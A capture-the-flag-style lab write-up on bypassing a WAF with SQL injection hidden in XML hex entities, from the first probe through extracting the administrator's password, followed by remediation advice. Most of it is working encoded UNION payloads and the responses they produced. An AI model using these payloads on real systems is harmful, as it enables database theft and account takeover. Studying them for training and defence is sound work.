# Lab: SQL injection with filter bypass via XML encoding

**Category:** SQL Injection\
**Difficulty:** Practitioner\
**Objective:** Retrieve the administrator's password from the `users` table and log in.

## 0. Attacker mindset

The stock check feature sends data in XML format (`Content-Type: application/xml`). A WAF is blocking classic SQL injection patterns like `'`, `OR`, `UNION`, and `--`. However, the server parses XML entities before the request reaches the SQL interpreter. If the WAF inspects the raw request before XML parsing, entities like `&#x27;` (for `'`) and `&#x4f;` (for `O`) might bypass the filter.

## 1. What is the vulnerability?

The `storeId` parameter inside the XML body is concatenated directly into a SQL query. A WAF blocks requests containing SQL keywords and special characters. However, the WAF inspects the raw request **before** XML parsing. By using XML hex entities (`&#x...;`), the WAF sees encoded characters while the server decodes them back to normal SQL syntax before execution.

## 2. How did I exploit it?

### Initial discovery

First test with classic SQL injection:

```xml
<storeId>1' OR 1=1--</storeId>
```

Response: `403 Forbidden - "Attack detected"` → WAF is active.

### Bypass attempt 1 - XML entities for quotes

```xml
<storeId>1&#x27; OR 1=1--</storeId>
```

Still `403 Attack detected`. The WAF also blocks `OR` and `--`.

### Bypass attempt 2 - XML entities for everything

Tried using Hackvertor with `html5_entities`:

```xml
<storeId>1&apos;&#32;OR&#32;1&equals;1&#45;&#45;</storeId>
```

Response: `400 Bad Request - "XML parsing error"` → `&equals;` is not a valid XML entity.

### Bypass attempt 3 - Hex entities for all special characters

Discovered that hex entities (`&#x4f;` for `O`, `&#x52;` for `R`, `&#x2d;` for `-`) work:

```xml
<storeId>1&#x27;&#x20;&#x4f;&#x52;&#x20;&#x31;&#x3d;&#x31;&#x2d;&#x2d;</storeId>
```

Response: `200 OK - 0 units` → WAF bypassed, but no data returned (query returned empty).

### Determining column count

```xml
<storeId>1&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x4e;&#x55;&#x4c;&#x4c;</storeId>
```

Response: `10 units` and `null` → Query has **1 column**.

### Testing string compatibility

```xml
<storeId>1&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x27;&#x61;&#x62;&#x63;&#x27;</storeId>
```

Response: `10 units` and `abc` → Column accepts strings.

### Extracting credentials from users table

Used `CONCAT` to merge username and password into a single column (technique from previous lab):

```xml
<storeId>1&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x4f;&#x4e;&#x43;&#x41;&#x54;&#x28;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x2c;&#x27;&#x7e;&#x27;&#x2c;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x29;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;</storeId>
```

Response returned all credentials:
- `administrator~8dskynphz837itmfflz9`
- `wiener~i553949howa4omh5o1ii`
- `carlos~fhcun5fwy7l1c9rt74hx`

### Final step

Logged in as `administrator` using the extracted password. Lab solved.

## 3. Impact

- WAF bypass using XML hex entities enables SQL injection even when classic patterns are blocked
- Full extraction of user credentials from the database
- Administrative account takeover

## 4. How can it be fixed?

- Use parameterized queries (prepared statements) - this would make SQL injection impossible regardless of encoding tricks
- Configure the WAF to decode XML entities **before** inspecting for malicious patterns
- Apply input validation on the application side, not just rely on a WAF

---

**MITRE ATT&CK:** [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
